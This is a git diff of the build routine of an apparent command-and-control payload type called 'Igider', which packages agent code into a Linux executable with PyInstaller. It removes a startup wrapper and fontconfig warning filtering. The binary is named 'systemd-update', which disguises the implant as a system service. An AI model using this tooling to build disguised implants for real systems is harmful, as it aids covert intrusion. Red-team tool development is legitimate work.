@@ -330,7 +330,6 @@ class Igider(PayloadType):
 
 
     def _build_executable(self, code: str) -> bytes:
-        # Check if PyInstaller is available
         try:
             subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                         capture_output=True, check=True)
@@ -338,69 +337,27 @@ class Igider(PayloadType):
             raise Exception("PyInstaller is not installed")
 
         with tempfile.TemporaryDirectory() as temp_dir:
-            # Create main Python file - keep original code intact
+            # Create main Python file
             main_py = os.path.join(temp_dir, "main.py")
             with open(main_py, "w") as f:
                 f.write(code)
 
-            # Create a startup script that sets environment and runs main
-            startup_script = os.path.join(temp_dir, "startup.py")
-            with open(startup_script, "w") as f:
-                f.write("""#!/usr/bin/env python3
-    import os
-    import sys
-    import subprocess
-
-    # Suppress fontconfig and GUI warnings
-    os.environ['FONTCONFIG_PATH'] = '/dev/null'
-    os.environ['FC_DEBUG'] = '0'
-    os.environ['QT_LOGGING_RULES'] = '*=false'
-
-    # Execute the main script with suppressed stderr for startup
-    try:
-        # Import and execute main code with warnings suppressed
-        import warnings
-        warnings.filterwarnings('ignore')
-        
-        # Temporarily suppress stderr during imports
-        original_stderr = sys.stderr
-        try:
-            import os
-            sys.stderr = open(os.devnull, 'w')
-            
-            # Import your main module here - this will be replaced by PyInstaller
-            exec(open('main.py').read())
-            
-        finally:
-            sys.stderr.close() if sys.stderr != original_stderr else None
-            sys.stderr = original_stderr
-            
-    except Exception as e:
-        print(f"Error: {e}", file=sys.stderr)
-        sys.exit(1)
-    """)
-
-            # Create comprehensive fontconfig environment
+            # Create fontconfig directory and minimal config
             fontconfig_dir = os.path.join(temp_dir, "fontconfig")
             os.makedirs(fontconfig_dir, exist_ok=True)
             
-            # Create minimal fonts.conf
             fonts_conf = os.path.join(fontconfig_dir, "fonts.conf")
             with open(fonts_conf, "w") as f:
-                f.write("""<?xml version="1.0"?>
+                f.write('''<?xml version="1.0"?>
     <!DOCTYPE fontconfig SYSTEM "fonts.dtd">
     <fontconfig>
-    <dir>/usr/share/fonts</dir>
-    <dir>/usr/local/share/fonts</dir>
-    <cachedir>/dev/null</cachedir>
-    </fontconfig>""")
+        <dir>/usr/share/fonts</dir>
+        <dir>/usr/local/share/fonts</dir>
+        <cachedir>/tmp/fonts-cache</cachedir>
+    </fontconfig>''')
 
-            # Generate and write spec file - use startup.py as entry point
+            # Generate and write spec file
             spec_content = self._create_pyinstaller_spec("linux")
-            # Replace 'main.py' with 'startup.py' in spec
-            spec_content = spec_content.replace("['main.py']", "['startup.py']")
-            spec_content = spec_content.replace("datas=[],", "datas=[('main.py', '.')],")
-            
             spec_path = os.path.join(temp_dir, "systemd-update.spec")
             with open(spec_path, "w") as f:
                 f.write(spec_content)
@@ -408,21 +365,16 @@ class Igider(PayloadType):
             exe_name = "systemd-update"
             exe_path = os.path.join(temp_dir, "dist", exe_name)
 
-            # Set comprehensive environment variables to suppress warnings
+            # Set fontconfig environment variables
             env = os.environ.copy()
-            env.update({
-                "FONTCONFIG_PATH": "/dev/null",
-                "FC_DEBUG": "0",
-                "QT_LOGGING_RULES": "*=false",
-                "PYTHONWARNINGS": "ignore",
-                "PYTHONHASHSEED": "0"
-            })
+            env["FONTCONFIG_PATH"] = fontconfig_dir
+            env["FONTCONFIG_FILE"] = fonts_conf
+            env["FC_DEBUG"] = "0"
 
-            # Build using spec file with suppressed output
+            # Build using spec file
             cmd = [
                 sys.executable, "-m", "PyInstaller",
                 "--clean",
-                "--log-level", "WARN",  # Reduce verbosity but show warnings
                 spec_path
             ]
 
@@ -434,33 +386,16 @@ class Igider(PayloadType):
                     text=True,
                     cwd=temp_dir,
                     timeout=300,
-                    env=env  # Use the modified environment
+                    env=env  # Pass the modified environment
                 )
 
                 if result.returncode != 0:
-                    # Filter out fontconfig warnings from stderr before logging
-                    stderr_lines = result.stderr.split('\n')
-                    filtered_stderr = '\n'.join([
-                        line for line in stderr_lines 
-                        if not any(keyword in line.lower() for keyword in [
-                            'fontconfig warning', 'reset-dirs', 'fontconfig error'
-                        ])
-                    ])
-                    
                     self.logger.error(f"PyInstaller stdout: {result.stdout}")
-                    if filtered_stderr.strip():  # Only log if there are actual errors
-                        self.logger.error(f"PyInstaller stderr: {filtered_stderr}")
-                    raise Exception(f"PyInstaller failed: {filtered_stderr}")
+                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
+                    raise Exception(f"PyInstaller failed: {result.stderr}")
 
                 if not os.path.exists(exe_path):
                     raise Exception(f"Executable not found at {exe_path}")
-
-                # Optional: log file type
-                try:
-                    ftype = subprocess.check_output(["file", exe_path], env=env).decode().strip()
-                    self.logger.info(f"Generated executable type: {ftype}")
-                except Exception:
-                    pass
 
                 with open(exe_path, "rb") as f:
                     return f.read()
